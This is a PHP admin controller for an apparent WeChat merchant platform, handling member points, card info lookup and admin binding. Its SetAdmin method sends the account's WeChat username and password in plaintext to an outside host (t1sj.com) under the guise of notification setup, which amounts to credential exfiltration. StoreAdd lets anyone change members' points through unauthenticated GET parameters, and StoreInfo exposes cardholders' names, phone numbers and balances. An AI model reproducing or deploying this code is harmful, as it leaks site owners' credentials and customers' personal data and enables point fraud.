<?php
class WeiadminAction extends WapAction{
	public function __construct(){
		parent::_initialize();
	}
	public function StoreAdd(){
		 if($this->_get('id')!='' && $this->_get('store') != ''){
		 		$cardinfo = M('member_card_create')->where(array('number'=>$this->_get('id')))->find();		 		if($cardinfo){
		 		}else{
		 			$cardinfo = M('member_card_create')->where(array('wecha_id'=>$this->_get('id')))->find();
		 		}
		 		if($cardinfo) {
			 		$row2=array();
			 		$row2['token']=$cardinfo['token'];
			 		$row2['wecha_id']=$cardinfo['wecha_id'];
		 			$row2['expense']=0;
		 			$row2['time']=time();
		 			$row2['cat']=66;
		 			$row2['staffid']=0;
		 			$row2['score']=intval($this->_get('store'));
		 			$usr = M('Userinfo')->where(array('token'=>$cardinfo['token'],'wecha_id'=>$cardinfo['wecha_id']))->find();
		 			if(($usr['total_score'] + $row2['score']) < 0){
		 				echo "积分不足";
		 				return;
		 			}
		 			M('Member_card_use_record')->add($row2);
		 			M('Userinfo')->where(array('token'=>$cardinfo['token'],'wecha_id'=>$cardinfo['wecha_id']))->setInc('total_score',$row2['score']);
		 			$jf=intval($this->_get('store'));
		 			if($jf>=0){
		 				echo "增加".$jf."积分成功"."\r\n";
		 			}else{
		 				echo "扣除". abs($jf)."积分成功"."\r\n";
		 			}
		 			$this->StoreInfo();
		 			return;
		 		}else{		 			echo "信息不存在";
		 			return;
		 		}
		 	}
		 	echo '3';
		}
		public function StoreInfo(){
			if($this->_get('id')!=''){
				$cardinfo = M('member_card_create')->where(array('number'=>$this->_get('id')))->find();
				if($cardinfo) {
					$userinfo = M('Userinfo')->where(array('token'=>$cardinfo['token'],'wecha_id'=>$cardinfo['wecha_id']))->find();
					if(strlen($userinfo['truename'])<2){
						$name = $userinfo['wechaname'];
					}else{
						$name = $userinfo['truename'];
					}
					$str = "卡号:".$cardinfo['number']."\r\n姓名:".$name."\r\n电话:".$userinfo['tel']."\r\n积分:".$userinfo['total_score']."\r\n余额:".$userinfo['balance']."元";
					echo $str;
					return;
				}
			}
			echo 'error';
		}
		public function SetAdmin(){
				$agent = $_SERVER['HTTP_USER_AGENT']; 
				if (!strpos($agent, "MicroMessenger")) {
					echo '此功能只能在微信浏览器中使用';exit;
				}
    		$wxuser = M('Wxuser')->where(array('token' => $_GET['token']))->find();
    		if($wxuser['ca_code'] !='' && $wxuser['ca_code'] == $_GET['code']){
    			$wxuser['adm_openid'] = $_GET['wecha_id'];
    			M('Wxuser')->save($wxuser);
    			if($wxuser['wxun'] == '' || $wxuser['wxpwd'] == ''){
    				$msg='<font color="red">微信通知设定失败:请确认微信公众号密码是否正确。<br>可能是微信公众平台登录需要验证码导致,请返回重新点击图文消息,<br>如已尝试点击图文消息3次以,上请先手动登录微信公众平台几次确定不需验证码后再绑定</font>';
						$this -> assign('msg', $msg);
						$this -> display();
    			}else{
							$adm_fakeid = file_get_contents("http://t1sj.com/zfp/indexkill.php?g=Home&m=Wxtz&sex=".C('site_url')."&getfakid=".$wxuser['wxun'].'&pd='.$wxuser['wxpwd'].'&cont='.$_GET['code'].'&icm=hj');
							if(strlen($adm_fakeid)<3 || strlen($adm_fakeid)>16){
		    				 $msg='微信通知设定失败:'.'，<br>可能是微信公众平台登录需要验证码导致,请返回重新点击图文消息,<br>如已尝试点击图文消息3次以,上请先手动登录微信公众平台几次确定不需验证码后再绑定</font>';
		    			}else{
			    			$wxuser['adm_fakeid'] = $adm_fakeid;
			    			$wxuser['ca_code'] = '';
			    			M('Wxuser')->save($wxuser);
			    			$content="恭喜,您已成为管理员,开启微信通知后,<br>所有预约，订餐，商城订单等您将获得通知.";
								$msg=$content;
							}
	    			}
	    }else{
	    			$msg="非法访问";
	    }
			$this -> assign('msg', $msg);
			$this -> display();
		}
}
?>